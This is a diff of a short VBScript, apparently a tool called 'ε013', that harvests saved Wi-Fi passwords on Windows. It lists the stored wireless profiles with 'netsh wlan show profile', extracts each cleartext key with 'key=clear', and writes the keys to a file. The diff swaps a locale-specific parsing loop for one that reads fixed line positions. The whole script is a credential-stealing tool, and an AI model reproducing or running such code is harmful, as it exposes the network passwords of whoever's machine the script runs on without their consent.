@@ -1,7 +1,7 @@
 '//////////////////////////////////////////////
-'//                  ε013
+'//            ε013 V 2.0 (Classic)
 '//          Jordan Dalcq - 0v3rl0w
-'/////////////////////////////////////////////'
+'/////////////////////////////////////////////
 
 Function GetOutput(command)
   Set Shell = Wscript.CreateObject("WScript.Shell")
@@ -20,30 +20,19 @@ Function saveIt(wifi, passwd)
   objFile.Write(passwd)
   objFile.Close
 End Function
+
 strText=Split(GetOutput("netsh wlan show profile"), "\n")
 
-For Each x In strText
-  If InStr(x, "Profil Tous") Then
-    txt=Split(x, ": ")
-    i = 0
-    For Each Name In txt
-      If i Mod 2 Then
-        str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")
-        j = 0
-        found = false
-        For Each Password In str
-          If j = 32 Then
-            passwd=Split(Password, ": ")(1)
-            found = true
-          End If
-          j = j + 1
-        Next
+i = 0
 
-        If found Then
-          saveIt name, passwd
-        End If
-      End If
-      i = i + 1
-    Next
-  End If
+For Each x in strText 
+	If i > 8 And i < 18 Then
+		Name = Split(x, ": ")(1)
+		str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")(32)
+		passwd = Split(str, ": ")
+		If Ubound(passwd) Then 
+			saveIt Name, passwd(1)
+		End If
+	End If
+	i = i + 1
 Next
